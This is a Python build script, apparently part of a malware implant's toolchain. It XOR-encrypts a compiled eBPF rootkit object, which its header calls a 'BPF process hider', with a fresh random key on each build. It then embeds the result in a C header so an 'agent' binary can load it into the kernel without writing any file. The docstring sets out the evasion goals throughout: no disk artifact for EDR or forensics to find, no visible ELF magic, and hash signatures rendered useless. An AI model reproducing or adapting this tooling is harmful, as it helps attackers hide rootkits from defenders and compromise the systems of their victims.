#!/usr/bin/env python3
"""
gen_bpf_hdr.py — Embed a compiled BPF program as an encrypted C header
========================================================================

PURPOSE
-------
This script takes a compiled BPF (Berkeley Packet Filter) object file
(``bpf_rootkit.bpf.o``), XOR-encrypts its raw bytes with a random 32-byte
key, and writes a C header (``bpf_rootkit_obj.h``) that contains the
encrypted bytes as a C array.

WHAT IS BPF / eBPF?
--------------------
eBPF (extended Berkeley Packet Filter) is a Linux kernel feature that lets
you run sandboxed programs INSIDE the kernel, without writing a full kernel
module.  It is heavily used for:
  - Network packet filtering (the original use case, hence "Packet Filter")
  - Performance profiling and tracing
  - Security monitoring (by security products like Falco, Cilium)
  - … and by rootkits, to hide processes, files, or network connections
    from userspace tools like ``ps``, ``ls``, ``ss``, etc.

A BPF program is compiled (e.g. by clang) from C into a special bytecode
format stored in an ELF object file (the `.bpf.o` file).  Normally you
would load it from disk with the ``bpftool`` utility or the libbpf library.

WHAT IS bpftool?
----------------
``bpftool`` is the standard CLI utility for managing eBPF programs.
Traditionally, ``bpftool gen skeleton`` would generate a C skeleton file
from a .bpf.o file, and ``bpftool load`` would load the object into the
kernel.  We do NOT use bpftool here — we do the embedding ourselves with
this Python script.

WHY EMBED AS A HEADER INSTEAD OF LOADING FROM DISK?
-----------------------------------------------------
If the agent simply dropped the .bpf.o file to disk and loaded it with
bpftool or libbpf, that file would be an obvious IOC: any EDR or forensic
tool scanning the filesystem would find it immediately.

By embedding the BPF bytecode inside the agent binary as a C byte array:
  1. No file is ever written to disk — the BPF object lives only in the
     agent binary and briefly in RAM during loading.  This is called a
     "no-disk artifact" or "fileless" technique.
  2. The BPF bytecode itself is XOR-encrypted, so even a memory scan of
     the agent binary does not reveal recognisable ELF magic bytes
     (0x7F 'E' 'L' 'F') at rest.
  3. Every build produces a DIFFERENT ciphertext (because the 32-byte key
     is chosen randomly), so binary hash-based signatures are useless.

HOW THE ENCRYPTION WORKS
-------------------------
We use a repeating-key XOR with a 32-byte random key:
  encrypted_byte[i] = original_byte[i] XOR key[i % 32]

32 bytes (256 bits) of random key material is far more than enough to
defeat any brute-force attempt.  At runtime the agent holds the key in
memory alongside the ciphertext array, XOR-decrypts the blob into a
memory buffer, and loads it directly into the kernel using the BPF
syscall — no file ever touches the filesystem.

Usage: python3 gen_bpf_hdr.py <bpf.o> <output.h>
"""
import sys, os, secrets

# ── Argument check ─────────────────────────────────────────────────────────────
if len(sys.argv) != 3:
    print(f"Usage: {sys.argv[0]} <bpf.o> <output.h>")
    sys.exit(1)

bpf_path = sys.argv[1]   # path to the compiled BPF ELF object, e.g. bpf_rootkit.bpf.o
out_path  = sys.argv[2]  # path to write the generated C header, e.g. bpf_rootkit_obj.h

# ── Read the compiled BPF object ───────────────────────────────────────────────
# The .bpf.o file is a standard ELF object file whose first 4 bytes are
# 0x7F, 'E', 'L', 'F'.  We read all its bytes into memory.
data = open(bpf_path, 'rb').read()

# ── Generate a random 32-byte key ─────────────────────────────────────────────
# secrets.token_bytes() uses the OS's cryptographically secure random number
# generator (/dev/urandom on Linux), so the key is different on every build.
key  = secrets.token_bytes(32)   # 32 bytes = 256 bits of randomness

# ── Encrypt: XOR every byte of the BPF object with the rotating key ───────────
# key[i % 32] cycles through the 32-byte key repeatedly, so byte 0 uses
# key[0], byte 1 uses key[1], ..., byte 31 uses key[31], byte 32 uses key[0]
# again, and so on.  This is called "repeating-key XOR" or a Vigenère cipher
# over binary data.
enc = bytes(b ^ key[i % 32] for i, b in enumerate(data))

# ── Build the C header lines ───────────────────────────────────────────────────
lines = [
    f"/* AUTO-GENERATED — do not edit */",
    f"/* BPF process hider — XOR-encrypted (random 32B key per build) */",
    # The 32-byte decryption key, stored as a C array of unsigned chars.
    # At runtime the agent uses this key to XOR-decrypt _bpf_obj_enc back into
    # the original ELF object before loading it into the kernel.
    f"static const unsigned char _bpf_obj_key[32] = {{",
    "    " + ", ".join(f"0x{b:02x}" for b in key),   # all 32 key bytes on one line
    "};",
    # The XOR-encrypted BPF ELF object.  This is what actually gets compiled
    # into the agent binary.  It looks like random noise — no ELF magic bytes.
    f"static const unsigned char _bpf_obj_enc[] = {{",
]

# ── Emit the encrypted bytes in rows of 12 ────────────────────────────────────
# Formatting as rows of 12 bytes per line keeps the header file readable and
# avoids excessively long lines (which some compilers or editors dislike).
row = []
for i, b in enumerate(enc):
    row.append(f"0x{b:02x}")   # format as lowercase hex, e.g. 0x3f
    if len(row) == 12:         # once we have 12 bytes on this row, flush it
        lines.append("    " + ", ".join(row) + ",")
        row = []               # start a new row

# Handle the last partial row (fewer than 12 remaining bytes) without a
# trailing comma, because some compilers warn about trailing commas in
# C89 mode even though C99+ allows them.
if row:
    lines.append("    " + ", ".join(row))
lines.append("};")

# The length is needed at runtime so the agent knows how many bytes to
# XOR-decrypt.  unsigned int is wide enough for any realistic BPF object.
lines.append(f"static const unsigned int _bpf_obj_len = {len(enc)};")

# ── Write the output header ────────────────────────────────────────────────────
with open(out_path, 'w') as f:
    f.write('\n'.join(lines) + '\n')

# Print a short summary: show only the first 4 bytes of the key as a sanity
# check that the key is different every run.
print(f"[*] {os.path.basename(bpf_path)}: {len(data)} bytes -> encrypted ({len(enc)} bytes), key: {key[:4].hex()}...")
